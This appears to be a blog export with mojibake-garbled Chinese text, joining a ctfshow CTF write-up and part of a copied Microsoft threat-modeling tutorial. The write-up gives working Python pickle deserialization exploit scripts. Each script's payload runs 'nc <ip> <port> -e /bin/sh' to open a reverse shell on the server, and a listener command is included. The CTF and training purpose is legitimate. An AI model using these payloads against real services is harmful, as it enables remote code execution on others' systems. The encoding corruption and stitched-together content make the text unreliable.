ï¼ˆè¾“å…¥æ–‡ä»¶å†…å®¹ï¼‰ è¡¨æ ¼å‚è€ƒè‡ªï¼šhttps://v0w.top/2020/03/12/phar-unsearise/ web277 python ååºåˆ—åŒ–Werkzeug/1.0.1 Python/3.7.9 pickle ååºåˆ—åŒ– Pythonååºåˆ—åŒ–ï¼Œä¹‹å‰æœ‰è¿‡ä¸€äº›ç ”ç©¶ï¼Œæ™šç‚¹æŠŠPythonååºåˆ—åŒ–åŸºç¡€é“¾æ¥æ›´æ–°ä¸Šæ¥~ å°è¯•äº†å¾ˆå¤šï¼Œå‘ç°æ˜¯æ— å›æ˜¾çš„ï¼Œéœ€è¦åå¼¹shell poc 123456789101112131415161718import base64import pickleimport requestsclass Exp(): def __reduce__(self): return(__import__(&quot;os&quot;).system, (&#x27;nc æœåŠ¡å™¨ip æœåŠ¡å™¨ç«¯å£ -e /bin/sh&#x27;,))exp = Exp()s = pickle.dumps(exp)s_base64 = base64.b64encode(s)url = &#x27;http://7a111fcd-ce76-4dde-9c49-5aec7f2bd40f.challenge.ctf.show:8080/backdoor&#x27;params=&#123; &#x27;data&#x27;: s_base64&#125;requests.get(url, params) å…ˆåœ¨æœåŠ¡å™¨ä¸Šç›‘å¬ 1nc -lvvp 7779 è¿è¡Œè„šæœ¬ 1python3 web277.py å›åˆ°æœåŠ¡å™¨ä¸Š cat ä¸€ä¸‹å³å¯ web278 python ååºåˆ—åŒ– ç®€å•ç»•è¿‡Werkzeug/1.0.1 Python/3.7.9 pickle ååºåˆ—åŒ– å’Œ web277 å·®ä¸å¤šï¼Œåªä¸è¿‡è¿‡æ»¤äº† systemï¼Œæ¢ä¸ªå‡½æ•°å³å¯ poc 123456789101112131415161718import base64import pickleimport requestsclass Exp(): def __reduce__(self): return(__import__(&quot;os&quot;).popen, (&#x27;nc æœåŠ¡å™¨ip æœåŠ¡å™¨ç«¯å£ -e /bin/sh&#x27;,))exp = Exp()s = pickle.dumps(exp)s_base64 = base64.b64encode(s)url = &#x27;http://e281b968-e161-414c-bd80-c7a79045351e.challenge.ctf.show:8080/backdoor&#x27;params=&#123; &#x27;data&#x27;: s_base64&#125;requests.get(url, params) ä¸€äº›å‚è€ƒçš„é¢˜è§£ https://blog.csdn.net/rfrder/article/details/113808539 (ç›®æ ‡wpï¼Œæ¡†æ¶é¢˜ä¹Ÿæœ‰è‡ªå·±åˆ†æï¼Œè†œæ‹œï¼) https://blog.csdn.net/miuzzx/article/details/110558192 https://blog.csdn.net/weixin_43578492/article/details/112128767","categories":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/categories/ctf/"},{"name":"ctfshow","slug":"ctf/ctfshow","permalink":"https://tari.moe/categories/ctf/ctfshow/"},{"name":"ctfç»ƒä¹ ","slug":"ctf/ctfshow/ctfç»ƒä¹ ","permalink":"https://tari.moe/categories/ctf/ctfshow/ctf%E7%BB%83%E4%B9%A0/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/tags/ctf/"},{"name":"ctfç»ƒä¹ ","slug":"ctfç»ƒä¹ ","permalink":"https://tari.moe/tags/ctf%E7%BB%83%E4%B9%A0/"},{"name":"ctfshow","slug":"ctfshow","permalink":"https://tari.moe/tags/ctfshow/"}]},{"title":"å¨èƒå»ºæ¨¡å®‰å…¨åŸºç¡€çŸ¥è¯†","slug":"thread-modeling","date":"2021-04-04T04:54:33.000Z","updated":"2021-04-05T07:32:03.568Z","comments":true,"path":"2021/04/04/thread-modeling/","link":"","permalink":"https://tari.moe/2021/04/04/thread-modeling/","excerpt":"","text":"å®ä¹ è¿‡ç¨‹ä¸­é›¶é›¶ç¢ç¢å­¦äº†ä¸€äº›ï¼Œä½†è¿˜æ²¡ç³»ç»Ÿå­¦è¿‡ï¼Œå‘ç°å¾®è½¯æœ‰ä¸ªæŒºå…¨é¢çš„ï¼Œæ‰“ç®—ç³»ç»Ÿå­¦ä¹ ä¸€æ³¢~ https://docs.microsoft.com/zh-cn/learn/paths/tm-threat-modeling-fundamentals/ æ„Ÿè§‰è®²çš„ç‰¹åˆ«å¥½â€¦æ‰€ä»¥å°±ç›´æ¥ç´¢æ€§ä¸€è¾¹çœ‹ä¸€è¾¹è¡¥å……çš„ copy ä¸‹æ¥äº† å¨èƒå»ºæ¨¡ç®€ä»‹å¨èƒå»ºæ¨¡æ˜¯ä¸€ç§æœ‰åŠ©äºä¿æŠ¤ç³»ç»Ÿã€åº”ç”¨ç¨‹åºã€ç½‘ç»œå’ŒæœåŠ¡çš„æœ‰æ•ˆæŠ€æœ¯ã€‚å®ƒå¯å¸®åŠ©ä½ åœ¨å¼€å‘ç”Ÿå‘½å‘¨æœŸçš„æ—©æœŸç¡®å®šæ½œåœ¨çš„å¨èƒå’Œé™ä½é£é™©ç­–ç•¥ã€‚ å¨èƒå»ºæ¨¡ä½¿ç”¨ä»¥å›¾å½¢å½¢å¼æ¼”ç¤ºç³»ç»Ÿå·¥ä½œæ–¹å¼çš„æ•°æ®æµå…³ç³»å›¾ã€‚ä¹‹åï¼Œå®ƒåº”ç”¨ä¸€ä¸ªæ¡†æ¶æ¥å¸®åŠ©ä½ å‘ç°å’Œä¿®å¤å®‰å…¨é—®é¢˜ã€‚ å¦‚æœæœªé¦–å…ˆå»ºç«‹å¨èƒæ¨¡å‹è€Œå‘å¸ƒç³»ç»Ÿï¼Œè¯¥ç³»ç»Ÿå°†ä½¿ä½ çš„å®¢æˆ·å’Œç»„ç»‡é¢ä¸´é£é™©ã€‚ ç®€å•èµ·è§ï¼Œæ­¤å­¦ä¹ è·¯å¾„å°†ç³»ç»Ÿã€åº”ç”¨ç¨‹åºå’ŒæœåŠ¡ç»Ÿç§°ä¸ºç³»ç»Ÿã€‚ ä½•æ—¶ä½¿ç”¨å¨èƒå»ºæ¨¡åœ¨è®¾è®¡æ–°ç³»ç»Ÿæˆ–æ›´æ–°ç°æœ‰ç³»ç»Ÿæ—¶ï¼Œå¯ä½¿ç”¨å¨èƒå»ºæ¨¡ã€‚ ç¤ºä¾‹åŒ…æ‹¬ï¼š åˆ›å»ºæ–°çš„ Azure å¾®æœåŠ¡ï¼Œç”¨äºæŠ¥å‘Šç»„ç»‡çš„äº‘èµ„æºä½¿ç”¨æƒ…å†µä»¥ä¾¿è¿›è¡Œé¢„ç®— è®¾è®¡å…¬å…± API ä»¥å‘å®¢æˆ·æä¾›å¯¹æ•°æ®çš„è®¿é—®æƒé™ å‘ç°æœ‰åº”ç”¨ç¨‹åºæ·»åŠ æ–°åŠŸèƒ½ è°å¯ä»¥è¿›è¡Œå¨èƒå»ºæ¨¡åªè¦äº†è§£ç³»ç»Ÿå¦‚ä½•å·¥ä½œï¼Œå¹¶ä¸”å¯¹å®‰å…¨æ€§æœ‰åŸºæœ¬çš„ç†è§£ï¼Œä»»ä½•äººéƒ½å¯ä»¥è¿›è¡Œå¨èƒå»ºæ¨¡ã€‚ æ­¤æŠ€æœ¯å¯åº”ç”¨äºä»»ä½•ï¼š è½¯ä»¶äº¤ä»˜æ–¹å¼ï¼ˆ å¦‚ æ•æ·å‹ æˆ– ç€‘å¸ƒå‹ ï¼Œå¥½å¤šç€‘å¸ƒå‹ä»‹ç»å¾ˆç¹çï¼Œç›´æ¥æ‰¾äº†ä¸ªå¯¹æ¯”çš„ï¼‰ éƒ¨ç½²èŠ‚å¥ï¼ˆæ¯å°æ—¶ã€æ¯æœˆæˆ–æ¯å¹´ï¼‰ å­¦ä¹ ç›®æ ‡åœ¨æœ¬æ¨¡å—ï¼Œä½ å°†äº†è§£å¨èƒå»ºæ¨¡çš„å››ä¸ªæ¦‚æ‹¬æ€§æ­¥éª¤ï¼Œå¹¶èƒ½å¤Ÿå­¦å¾—ä»¥ä¸‹å†…å®¹ï¼š äº†è§£æ˜ç¡®è¦æ±‚å’Œå‡è®¾ä»¥å¸®åŠ©åˆ›å»ºæ•°æ®æµå…³ç³»å›¾çš„é‡è¦æ€§ äº†è§£å¯å¸®åŠ©ä½ æŸ¥æ‰¾ç³»ç»Ÿä¸­å®‰å…¨é—®é¢˜çš„æ¡†æ¶ äº†è§£æœ‰åŠ©äºå‡è½»æˆ–æ¶ˆé™¤æ½œåœ¨å¨èƒçš„å®‰å…¨æ§åˆ¶ç±»åˆ« é‡ç‚¹ä»‹ç»åœ¨éƒ¨ç½²ä¹‹å‰éªŒè¯å‡è®¾ã€è¦æ±‚å’Œä¿®å¤çš„é‡è¦æ€§ æ— å¿…å¤‡çŸ¥è¯†å³å¯å­¦ä¹  ï¼ˆ æ¨¡å—1 | å¨èƒå»ºæ¨¡é˜¶æ®µåªè¦äº†è§£ç³»ç»Ÿå·¥ä½œåŸç†ï¼Œå¹¶å…·æœ‰ä¿¡æ¯å®‰å…¨çŸ¥è¯†ï¼Œä»»ä½•äººéƒ½å¯ä»¥ä½¿ç”¨å¨èƒå»ºæ¨¡æŠ€æœ¯ã€‚ æ­¤æ–¹æ³•åˆ†ä¸ºå››ä¸ªä¸åŒçš„é˜¶æ®µï¼Œæ¯ä¸ªé˜¶æ®µéƒ½åŒ…å«é‡è¦æ­¥éª¤ï¼Œå¯å¸®åŠ©ä½ åˆ›å»ºæ•°æ®æµå…³ç³»å›¾å¹¶å¯¹å…¶è¿›è¡Œåˆ†æï¼Œä»¥å‘ç°æ½œåœ¨çš„å¨èƒã€‚ é˜¶æ®µ æ ‡é¢˜ è¯´æ˜ 1 è®¾è®¡ æ˜ç¡®ç³»ç»Ÿçš„æ‰€æœ‰è¦æ±‚ï¼Œå¹¶åˆ›å»ºæ•°æ®æµå…³ç³»å›¾ 2 ä¸­æ–­ å°†å¨èƒå»ºæ¨¡æ¡†æ¶åº”ç”¨åˆ°æ•°æ®æµå…³ç³»å›¾ 3 ä¿®å¤ ç¡®å®šå¦‚ä½•æ­£ç¡®ç»„åˆå®‰å…¨æ§åˆ¶æ¥è§£å†³æ¯ä¸ªé—®é¢˜ 4 éªŒè¯ éªŒè¯æ˜¯å¦æ»¡è¶³äº†è¦æ±‚ æœ¬æ¨¡å—(1) ä¸­çš„å•å…ƒå°†è¾ƒä¸ºæ¦‚æ‹¬åœ°ä»‹ç»é‡è¦çš„å¨èƒå»ºæ¨¡æ¦‚å¿µï¼Œæœ¬æ–‡ æ¨¡å—2 å¼€å§‹å°†è¯¦ç»†è®¨è®ºè¿™äº›æ¦‚å¿µã€‚ æ­¥éª¤1 - è®¾è®¡è®¾è®¡é˜¶æ®µæ˜¯è¿›è¡Œå¨èƒå»ºæ¨¡æ´»åŠ¨çš„åŸºç¡€ã€‚ ä½ éœ€è¦å°½å¯èƒ½å¤šåœ°æ”¶é›†å…³äºä½ æ‰€æ„å»ºçš„å†…å®¹åŠæ‰€ç”¨èµ„æºçš„æ•°æ®ã€‚ ç›®æ ‡ æ¸…æ¥šåœ°äº†è§£ç³»ç»Ÿçš„å·¥ä½œåŸç† åˆ—å‡ºç³»ç»Ÿä½¿ç”¨çš„æ¯ä¸ªæœåŠ¡ æšä¸¾æœ‰å…³ç¯å¢ƒå’Œé»˜è®¤å®‰å…¨é…ç½®çš„æ‰€æœ‰å‡è®¾ ä½¿ç”¨æ­£ç¡®çš„ä¸Šä¸‹æ–‡æ·±åº¦çº§åˆ«åˆ›å»ºæ•°æ®æµå…³ç³»å›¾ å¦‚æœä¸å®Œæˆæ­¤é˜¶æ®µï¼Œä½ å¯èƒ½ä¼šå¿½ç•¥ç³»ç»Ÿçš„é‡è¦å®‰å…¨è®¾è®¡æ³¨æ„äº‹é¡¹ï¼Œè¿™å¯èƒ½ä¼šä½¿ä½ çš„å®¢æˆ·é¢ä¸´é£é™©ã€‚ æå‡ºæœ‰å…³ç³»ç»Ÿçš„é—®é¢˜å°½å¯èƒ½å¤šåœ°æå‡ºæœ‰å…³ç³»ç»Ÿçš„é—®é¢˜ã€‚ å¯ä»¥è€ƒè™‘ä»¥ä¸‹é—®é¢˜ï¼š åŒºåŸŸ é—®é¢˜ ç³»ç»Ÿè¯´æ˜ ç³»ç»Ÿçš„åŠŸèƒ½æ˜¯ä»€ä¹ˆï¼Ÿ æœåŠ¡å¤„ç†çš„ä¸šåŠ¡æµç¨‹æ˜¯ä»€ä¹ˆï¼Ÿ æ˜¯å¦æ˜ç¡®å®šä¹‰äº†è¿™äº›æµç¨‹ï¼Ÿ ç³»ç»Ÿç¯å¢ƒ ç³»ç»Ÿæ˜¯åœ¨äº‘ä¸­è¿˜æ˜¯åœ¨æœ¬åœ°æ„å»ºçš„ï¼Ÿ å®ƒå°†åœ¨å“ªä¸ª OS ä¸Šæ„å»ºï¼Ÿ æ˜¯å¦å°†ä½¿ç”¨å®¹å™¨ï¼Ÿ ç³»ç»Ÿæ˜¯åº”ç”¨ç¨‹åºã€æœåŠ¡è¿˜æ˜¯å…¶ä»–å®Œå…¨ä¸åŒçš„ä¸œè¥¿ï¼Ÿ æ–¹æ¡ˆ ç”¨æˆ·å°†å¦‚ä½•ä½¿ç”¨ç³»ç»Ÿï¼Ÿ å¦‚ä½•ä¸ä½¿ç”¨ç³»ç»Ÿï¼Ÿ æƒé™ ç³»ç»Ÿæ˜¯å¦æœ‰è„šæœ¬æ‰§è¡Œã€æ•°æ®æˆ–ç¡¬ä»¶è®¿é—®è¦æ±‚ï¼Ÿ å¦‚æœæœ‰ï¼Œæ˜¯å“ªäº›è¦æ±‚ï¼Ÿ äº‘æä¾›å•† ç³»ç»Ÿå°†ä½¿ç”¨å“ªä¸ªäº‘æä¾›å•†ï¼Ÿ å®ƒæä¾›å“ªäº›é»˜è®¤å®‰å…¨é…ç½®é€‰é¡¹ï¼Ÿ è¿™äº›é€‰é¡¹å¦‚ä½•å½±å“ç³»ç»Ÿå®‰å…¨è¦æ±‚ï¼Ÿ æ“ä½œç³»ç»Ÿ ç³»ç»Ÿå°†ä½¿ç”¨å“ªç§æ“ä½œç³»ç»Ÿï¼Ÿ å®ƒæä¾›å“ªäº›é»˜è®¤å®‰å…¨é…ç½®é€‰é¡¹ï¼Ÿ è¿™äº›é€‰é¡¹å¦‚ä½•å½±å“ç³»ç»Ÿå®‰å…¨è¦æ±‚ï¼Ÿ ç¬¬ä¸€æ–¹å’Œç¬¬ä¸‰æ–¹ ç³»ç»Ÿå°†ä½¿ç”¨å“ªäº›ç¬¬ä¸€æ–¹å’Œç¬¬ä¸‰æ–¹æœåŠ¡ï¼Ÿ å®ƒä»¬æä¾›å“ªäº›é»˜è®¤å®‰å…¨é…ç½®é€‰é¡¹ï¼Ÿ è¿™äº›é€‰é¡¹å¦‚ä½•å½±å“ç³»ç»Ÿå®‰å…¨è¦æ±‚ï¼Ÿ å¸æˆ· ç³»ç»Ÿä¸­å°†ä½¿ç”¨å“ªäº›å¸æˆ·ç±»å‹ï¼Œä¾‹å¦‚ç”¨æˆ·å’Œç®¡ç†å‘˜ï¼Ÿ è¿™äº›å¸æˆ·æ˜¯æœ¬åœ°å¸æˆ·è¿˜æ˜¯äº‘å¸æˆ·ï¼Ÿ å®ƒä»¬éœ€è¦å“ªäº›è®¿é—®æƒé™ï¼Ÿä¸ºä»€ä¹ˆï¼Ÿ æ ‡è¯†å’Œè®¿é—®æ§åˆ¶ ç³»ç»Ÿå°†å¦‚ä½•å¸®åŠ©ä¿æŠ¤è¿™äº›å¸æˆ·ï¼Ÿ å®ƒä¼šä¾èµ– Azure Active Directory (Azure AD) å—ï¼Ÿ å®ƒä¼šä½¿ç”¨è®¿é—®æ§åˆ¶åˆ—è¡¨ (ACL)ã€å¤šé‡èº«ä»½éªŒè¯ (MFA) å’Œä¼šè¯æ§åˆ¶ç­‰åŠŸèƒ½å—ï¼Ÿ ä»¤ç‰Œå’Œä¼šè¯ ç³»ç»Ÿä¼šå¤„ç† SOAP API æˆ– REST API ä¹‹ç±»çš„è¯·æ±‚å—ï¼Ÿ å®ƒå°†å¦‚ä½•å¤„ç†ä¸åŒçš„ä¼šè¯ï¼Ÿ æ—è·¯ ç³»ç»Ÿæ˜¯å¦ä½¿ç”¨æˆ–éœ€è¦åé—¨ï¼Ÿ å¦‚æœéœ€è¦ï¼Œå®ƒå°†å¦‚ä½•å·¥ä½œï¼Ÿ è®°å½•ã€ç›‘è§†å’Œå¤‡ä»½ ç³»ç»Ÿä½¿ç”¨ä»€ä¹ˆæœºåˆ¶æ¥è®°å½•å®‰å…¨äº‹ä»¶ã€ç›‘è§†å¼‚å¸¸å’Œå¤‡ä»½ç³»ç»Ÿæ•°æ®ï¼Ÿ å®ƒä¼šæ•è·å“ªäº›äº‹ä»¶ç±»å‹ï¼Ÿ ç½‘ç»œ å°†ä½¿ç”¨å“ªäº›å…¥ä¾µæ£€æµ‹å’Œä¿æŠ¤ç³»ç»Ÿï¼Ÿ å¦‚ä½•å¯¹é€šä¿¡è¿›è¡ŒåŠ å¯†ï¼Ÿ æ•°æ® ç³»ç»Ÿå°†åˆ›å»ºæˆ–å¤„ç†å“ªç§ç±»å‹çš„æ•°æ®ï¼Ÿ æ•°æ®åˆ†ç±»ç±»å‹æ˜¯ä»€ä¹ˆï¼Ÿ ç³»ç»Ÿå¦‚ä½•ä¿¡ä»»æ•°æ®æºï¼Ÿ å®ƒå°†å¦‚ä½•åˆ†ææ•°æ®ï¼Ÿ é¢„æœŸçš„è¾“å…¥å’Œè¾“å‡ºè¡Œä¸ºæ˜¯ä»€ä¹ˆï¼Ÿ å¦‚ä½•å¤„ç†éªŒè¯ï¼Ÿ å¦‚ä½•åœ¨æ‰€æœ‰çŠ¶æ€ä¸‹å¯¹æ•°æ®è¿›è¡ŒåŠ å¯†ï¼Ÿ æœºå¯†ç®¡ç† ç³»ç»Ÿå¦‚ä½•å¤„ç†å¯†é’¥ã€è¯ä¹¦å’Œå‡­æ®ï¼Ÿ ä¸Šé¢åˆ—å‡ºçš„å†…å®¹å¾ˆå¹¿æ³›ï¼Œä½†å¹¶ä¸è¯¦å°½ã€‚ ä¸ä½ çš„åŒäº‹å’Œå®‰å…¨å›¢é˜Ÿè”ç³»ï¼Œä»¥æ˜ç¡®ç³»ç»Ÿçš„æ‰€æœ‰ç›¸å…³ä¸Šä¸‹æ–‡ã€‚ å¦‚æœä½ æœ‰ä¸“é—¨çš„å®‰å…¨å›¢é˜Ÿï¼Œè¯·ä¸ä»–ä»¬å®‰æ’ç™½æ¿ä¼šè®®ä»¥è¿›è¡Œåˆå§‹è®¾è®¡ã€‚ å®ƒå°†èŠ‚çœç›¸å½“é•¿çš„æ—¶é—´ã€‚ åˆ›å»ºæ•°æ®æµå…³ç³»å›¾ä½¿ç”¨ç­”æ¡ˆåˆ›å»ºæ•°æ®æµå…³ç³»å›¾ã€‚ å®ƒæ˜¾ç¤ºäº†æ•°æ®ç”Ÿå‘½å‘¨æœŸä¸­æ¯ä¸ªé˜¶æ®µçš„æ•°æ®ï¼ŒåŒ…æ‹¬ä¿¡ä»»åŒºä¸­çš„æ›´æ”¹ã€‚ ç¤ºä¾‹åŒ…æ‹¬ï¼š ç”¨æˆ·ç™»å½•åˆ° Azure ä¸­æ‰˜ç®¡çš„ Web åº”ç”¨ç¨‹åºä»¥è®¿é—®æ•°æ® ç®¡ç†å‘˜æ›´æ”¹ Web åº”ç”¨ç¨‹åºä½¿ç”¨çš„å¼¹æ€§èµ„æºçš„é»˜è®¤å®‰å…¨é…ç½® è‡ªåŠ¨åŒ–çš„æ¯æ—¥è„šæœ¬ï¼Œç”¨äºç›‘è§† Web åº”ç”¨ç¨‹åºçš„æ´»åŠ¨æ—¥å¿—å¹¶é€šçŸ¥ç®¡ç†å‘˜ä»»ä½•å¼‚å¸¸æƒ…å†µ Microsoft å·¥ç¨‹å›¢é˜Ÿéœ€è¦æäº¤æ•°æ®æµå…³ç³»å›¾ï¼Œè¿™æ˜¯å…¶å®‰å…¨åˆè§„æ€§è¦æ±‚ã€‚ è¿™äº›å…³ç³»å›¾æœ‰åŠ©äºè¿›è¡Œä¸å®‰å…¨æ€§ç›¸å…³çš„æ¢è®¨ã€‚ å›¾è§£å·¥å…·Microsoft å·¥ç¨‹å¸ˆå»ºè®®ä½¿ç”¨ç°åœ¨æä¾›çš„ä¸¤ç§å·¥å…·ä¹‹ä¸€ï¼š Threat Modeling Tool åœ¨çº¿å®‰è£…ç‰ˆï¼Œhttps://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling ç¦»çº¿å®‰è£…ç‰ˆï¼Œhttps://www.microsoft.com/en-us/download/details.aspx?id=49168 ï¼ˆ2016ï¼‰ æƒ³è£…å…¶ä»–ç¦»çº¿ç‰ˆæœ¬çš„ï¼ŒGuguru ä¸€ä¸‹ microsoft threat modeling tool offline installer å°±å¥½äº† Visioï¼Œï¼ˆè¦é’±çš„ æ‰“æ‰°äº† å…³ç³»å›¾å…ƒç´ æ•°æ®æµå…³ç³»å›¾æ˜¾ç¤ºäº†ç»™å®šç³»ç»Ÿä¸­çš„æ•°æ®æµã€‚ å®ƒé€šå¸¸ä»¥ç”¨æˆ·æˆ–æ•°æ®å­˜å‚¨çš„è¯·æ±‚å¼€å§‹ï¼Œä»¥æ•°æ®å­˜å‚¨æˆ– Analytics Services ç»“æŸã€‚ æ•°æ®æµå…³ç³»å›¾ä½¿ç”¨ä¸åŒçš„å½¢çŠ¶æ¥æŒ‡ç¤ºå®ƒä»¬æ‰€è¡¨ç¤ºçš„å…ƒç´ ã€‚ å…ƒç´  å½¢çŠ¶ å®šä¹‰ è¿‡ç¨‹ æ¥æ”¶ã€ä¿®æ”¹è¾“å…¥æˆ–å°†è¾“å…¥é‡å®šå‘åˆ°è¾“å‡ºçš„ä»»åŠ¡ï¼Œå¦‚ Web æœåŠ¡ã€‚ æ•°æ®å­˜å‚¨ æ°¸ä¹…å’Œä¸´æ—¶æ•°æ®å­˜å‚¨ï¼Œå¦‚ Web ç¼“å­˜å’Œ Azure æ‰˜ç®¡æ•°æ®åº“ã€‚ å¤–éƒ¨å®ä½“ ç›´æ¥æ§åˆ¶ä¹‹å¤–çš„ä»»åŠ¡ã€å®ä½“æˆ–æ•°æ®å­˜å‚¨ï¼Œå¦‚ç”¨æˆ·å’Œç¬¬ä¸‰æ–¹ APIã€‚ æ•°æ®æµ è¿›ç¨‹ã€æ•°æ®å­˜å‚¨å’Œå¤–éƒ¨å®ä½“ä¹‹é—´çš„æ•°æ®ç§»åŠ¨ï¼Œå¦‚è¿æ¥å­—ç¬¦ä¸²å’Œæœ‰æ•ˆè´Ÿè½½ã€‚ ä¿¡ä»»è¾¹ç•Œ ä¿¡ä»»åŒºåŸŸåœ¨æ•°æ®æµç»ç³»ç»Ÿæ—¶æ›´æ”¹ï¼Œå¦‚ç”¨æˆ·ä½¿ç”¨ Internet è®¿é—®å—ä¿æŠ¤çš„å…¬å¸ç½‘ç»œæ—¶ã€‚ æ•°æ®æµå…³ç³»å›¾å…ƒç´ è¿˜éœ€è¦ä¸Šä¸‹æ–‡ï¼Œä»¥å¸®åŠ©äººä»¬äº†è§£å¦‚ä½•åœ¨ç³»ç»Ÿä¸­çš„ä½¿ç”¨å’Œä¿æŠ¤å®ƒä»¬ã€‚ æ•°æ®æµå›¾æ ‡ä¸­åº”åŒ…å«çš„ä¿¡æ¯é‡æ•°æ®æµå…³ç³»å›¾ä¸­åŒ…å«çš„ä¿¡æ¯é‡å–å†³äºå‡ ä¸ªå…³é”®å› ç´ ï¼š å› ç´  è¯´æ˜ æ­£åœ¨æ„å»ºçš„ç³»ç»Ÿç±»å‹ å¦‚æœç³»ç»Ÿä¸å¤„ç†æ•æ„Ÿæ•°æ®æˆ–ä»…åœ¨å†…éƒ¨ä½¿ç”¨ï¼Œåˆ™å®ƒå¯èƒ½æ¯”é¢å‘å¤–éƒ¨çš„ç³»ç»Ÿéœ€è¦æ›´å°‘çš„ä¸Šä¸‹æ–‡ å®‰å…¨å›¢é˜Ÿæ‰€éœ€çš„ä¸Šä¸‹æ–‡ å®‰å…¨å›¢é˜Ÿåœ¨å¨èƒæ¨¡å‹ä¸­çš„ç›®æ ‡éå¸¸ç²¾ç¡®ã€‚ ä¸å®‰å…¨å›¢é˜Ÿäº¤æµï¼Œç¡®è®¤æ‰€éœ€çš„å±‚æ¬¡ å¦‚æœæœªèƒ½åŒ…å«æ­£ç¡®çš„ä¸Šä¸‹æ–‡ï¼Œå°†å¯¼è‡´å®‰å…¨æ£€æŸ¥ä¸å®Œæ•´ã€ç³»ç»Ÿå­˜åœ¨æ½œåœ¨çš„é£é™©ã€‚ å…³ç³»å›¾å±‚æ¬¡ä¸ºäº†å¸®åŠ©ä½ äº†è§£è¦åŒ…å«çš„ä¿¡æ¯é‡ï¼Œè¯·åœ¨ä»¥ä¸‹å››ä¸ªä¸Šä¸‹æ–‡å±‚æ¬¡ä¹‹é—´è¿›è¡Œé€‰æ‹©ï¼š å±‚æ¬¡ æ ‡é¢˜ è¯´æ˜ 0 ç³»ç»Ÿ ä»»ä½•ç³»ç»Ÿçš„åŸºç¡€ã€‚ æ•°æ®æµå…³ç³»å›¾åŒ…å«ç³»ç»Ÿçš„ä¸»è¦éƒ¨åˆ†ï¼Œå¹¶æä¾›è¶³å¤Ÿçš„ä¸Šä¸‹æ–‡ï¼Œå¯å¸®åŠ©ä½ äº†è§£å…¶å·¥ä½œåŸç†åŠå½¼æ­¤äº¤äº’æ–¹å¼ã€‚ 1 æµç¨‹ ä½¿ç”¨é¢å¤–çš„æ•°æ®æµå…³ç³»å›¾ï¼Œå…³æ³¨ç³»ç»Ÿæ¯ä¸ªéƒ¨åˆ†çš„æ•°æ®æµå…³ç³»å›¾ã€‚ ç”¨äºæ¯ä¸ªç³»ç»Ÿï¼Œå°¤å…¶æ˜¯å¤„ç†æ•æ„Ÿæ•°æ®çš„ç³»ç»Ÿã€‚ æ­¤å±‚çš„ä¸Šä¸‹æ–‡åº”æœ‰åŠ©äºç¡®å®šå¨èƒä»¥åŠæ›´æœ‰æ•ˆåœ°é™ä½æˆ–æ¶ˆé™¤é£é™©çš„æ–¹æ³•ã€‚ 2 å­è¿‡ç¨‹ å…³æ³¨ç³»ç»Ÿä¸­æŸä¸€éƒ¨åˆ†çš„æ¯ä¸ªæ¬¡çº§éƒ¨åˆ†çš„æ•°æ®æµå…³ç³»å›¾ã€‚ ç”¨äºå…³é”®çš„ç³»ç»Ÿã€‚ ç¤ºä¾‹åŒ…æ‹¬é€‚ç”¨äºå®‰å…¨ç¯å¢ƒçš„ç³»ç»Ÿã€å¤„ç†é«˜åº¦æ•æ„Ÿæ•°æ®çš„ç³»ç»Ÿæˆ–åŒ…å«é«˜é£é™©è¯„çº§çš„ç³»ç»Ÿã€‚ 3 æ›´è¯¦ç»† å…³æ³¨é«˜åº¦å…³é”®çš„å†…æ ¸çº§ç³»ç»Ÿã€‚ æ•°æ®æµå…³ç³»å›¾è¯¦ç»†æè¿°æ¯ä¸ªå­è¿‡ç¨‹ã€‚ å¤§å¤šæ•°æ•°æ®æµå…³ç³»å›¾åº”åŒæ—¶åŒ…å«ç¬¬ 0 å±‚å’Œç¬¬ 1 å±‚ã€‚ ä¸å®‰å…¨å›¢é˜Ÿäº¤æµï¼Œç¡®è®¤æ‰€éœ€çš„å±‚æ¬¡æ·±åº¦ã€‚ å·¥å…· Threat Modeling Tool åœ¨çº¿å®‰è£…ç‰ˆï¼Œhttps://www.microsoft.com/en-us/securityengineering/sdl/threatmodeling ç¦»çº¿å®‰è£…ç‰ˆï¼Œhttps://www.microsoft.com/en-us/download/details.aspx?id=49168 ï¼ˆ2016ï¼‰ æƒ³è£…å…¶ä»–ç¦»çº¿ç‰ˆæœ¬çš„ï¼ŒGuguru ä¸€ä¸‹ microsoft threat modeling tool offline installer å°±å¥½äº† Visioï¼Œï¼ˆè¦é’±çš„ æ‰“æ‰°äº† çŸ¥è¯†æ£€æŸ¥ è®¾è®¡é˜¶æ®µè¦è¿›è¡Œå“ªäº›å·¥ä½œï¼Ÿ A. ä½ çŸ¥é“ç³»ç»Ÿçš„å·¥ä½œæ–¹å¼ã€‚ è¿˜å¯ä»¥ç¡®å®šä»äº‘æä¾›å•†å’Œé›†æˆæœåŠ¡ç»§æ‰¿çš„å®‰å…¨è¦æ±‚ã€ä¿è¯æˆ–å·®è· B. æ­¤æ—¶ä¸å¿…ç ”ç©¶æ‰€æœ‰å®‰å…¨ä¿è¯ã€å‡è®¾å’Œå·®è·ï¼Œå”¯ä¸€çš„ä»»åŠ¡å°±æ˜¯åˆ›å»ºæ•°æ®æµå…³ç³»å›¾ C. åœ¨åˆ›å»ºæ•°æ®æµå…³ç³»å›¾ä¹‹å‰ï¼Œç¡®å®šå¹¶è§£å†³ä¸ç³»ç»Ÿç›¸å…³çš„æ‰€æœ‰å®‰å…¨é—®é¢˜ å‚è€ƒç­”æ¡ˆï¼š== A == è§£é‡Šï¼šA. åœ¨åˆ›å»ºæ•°æ®æµå…³ç³»å›¾ä¹‹å‰ï¼Œè¯·å°½å¯èƒ½æ”¶é›†æœ‰å…³ç³»ç»Ÿçš„ä¸Šä¸‹æ–‡ã€‚B. åœ¨è®¾è®¡é˜¶æ®µè¾ƒæ—©æ”¶é›†å°½å¯èƒ½å¤šçš„ä¸Šä¸‹æ–‡ï¼Œä½ å°±å¯ä»¥åšå‡ºæ˜æ™ºçš„å†³ç­–ä»¥æ›´å¥½åœ°ä¿æŠ¤ç³»ç»Ÿã€‚C. åœ¨è®¾è®¡é˜¶æ®µä¹‹åçš„ä¸­æ–­å’Œä¿®å¤é˜¶æ®µæ‰§è¡Œåˆ›å»ºå…³ç³»å›¾çš„ä»»åŠ¡ã€‚ æ­¥éª¤2 - 